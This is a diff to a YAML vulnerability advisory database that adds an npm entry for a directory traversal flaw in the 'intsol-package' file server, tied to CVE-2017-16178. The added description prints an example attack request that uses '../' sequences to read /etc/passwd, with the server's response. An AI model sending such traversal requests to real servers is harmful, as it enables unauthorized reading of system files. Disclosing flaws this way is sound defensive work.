@@ -1,5 +1,40 @@
 ---
-- id: snykio:npm:intsol-package:CVE-2017-16178
+- id: npmjs:npm:intsol-package:461
+  title: Directory Traversal
+  description: |-
+    `intsol-package` is a file server.
+
+    `intsol-package` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing "../" in the url.
+
+    Example Request:
+    ```
+    GET /../../../../../../../../../../etc/passwd HTTP/1.1
+    host:localhost
+    ```
+    and the server's Response
+    ```
+    HTTP/1.1 200 OK
+    Date: Thu, 04 May 2017 23:59:18 GMT
+    Connection: keep-alive
+    Transfer-Encoding: chunked
+
+    {contents of /etc/passwd}
+    ```
+  affected_package: intsol-package
+  vulnerable_versions:
+  - "<=99.999.9999"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2017-16178
+  cwe: CWE-22
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Liang Gong
+  references: https://npmjs.com/advisories/461
+  source_url: https://npmjs.com/advisories/461
+- id: snykio:npm:intsol-package:20170511
   title: Directory Traversal
   description: |
     [`intsol-package`][1] is this is a simple node program.
